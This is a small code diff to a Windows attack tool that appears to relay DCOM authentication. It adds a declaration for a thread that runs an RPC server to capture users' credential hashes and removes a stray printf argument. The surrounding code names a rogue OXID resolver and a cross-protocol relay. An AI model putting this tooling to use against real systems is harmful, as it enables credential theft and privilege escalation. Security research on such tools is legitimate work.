@@ -18,6 +18,7 @@ BOOL g_SuccessTrigger = FALSE;
 
 DWORD WINAPI ThreadRogueOxidResolver(LPVOID lpParam);
 DWORD WINAPI ThreadHTTPCrossProtocolRelay(LPVOID lpParam);
+DWORD WINAPI ThreadRpcServerCaptureCredsHash(LPVOID lpParam);
 void TriggerDCOM(wchar_t*);
 void TriggerDCOMWithSessionID(wchar_t*);
 void usage();
@@ -136,7 +137,7 @@ int wmain(int argc, wchar_t** argv)
 		hThreadServer = CreateThread(NULL, 0, ThreadHTTPCrossProtocolRelay, (LPVOID)& threads_params, 0, NULL);
 	}
 	else {
-		printf("[*] Starting the RPC server to capture the credentials hash from the user authentication!!\n", remoteHTTPRelayServerIp);
+		printf("[*] Starting the RPC server to capture the credentials hash from the user authentication!!\n");
 		hThreadServer = CreateThread(NULL, 0, ThreadRpcServerCaptureCredsHash, (LPVOID)& threads_params, 0, NULL);
 	}
 
